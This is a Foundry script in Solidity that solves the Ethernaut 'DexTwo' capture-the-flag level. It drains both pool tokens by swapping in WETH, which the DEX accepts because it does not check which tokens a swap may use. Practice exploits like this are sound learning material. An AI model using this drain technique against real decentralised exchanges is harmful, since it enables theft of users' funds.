// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";
interface DexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns(bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface WETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
}
// import "../../src/23-DexTwoAttacker.sol";

contract DexTwoSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xf59112032D54862E199626F55cFad4F8a3b0Fce9;
    address constant WETH_ADDRESS = 0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
    address User = vm.envAddress("ACCOUNT_ADDRESS");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE make sure to change original function into "_createInstance()" for the correct challengeInstance address.
        address challengeInstance = _createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        DexTwo dexTwo = DexTwo(challengeInstance);
        IERC20 token1 = IERC20(dexTwo.token1());
        IERC20 token2 = IERC20(dexTwo.token2());
        dexTwo.approve(challengeInstance, 1000000000000000000);
        WETH(WETH_ADDRESS).deposit{value: 4}();
        IERC20 weth = IERC20(WETH_ADDRESS);
        weth.approve(challengeInstance, 3);
        weth.transfer(challengeInstance, 1);
        dexTwo.swap(WETH_ADDRESS, dexTwo.token1(), 1);
        dexTwo.swap(WETH_ADDRESS, dexTwo.token2(), 2);
      
        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(23));
    }

        function min(uint256 a, uint256 b) internal returns(uint256){
            if (a < b) {
                return a;
            } else {
                return b;
            }
        }
}
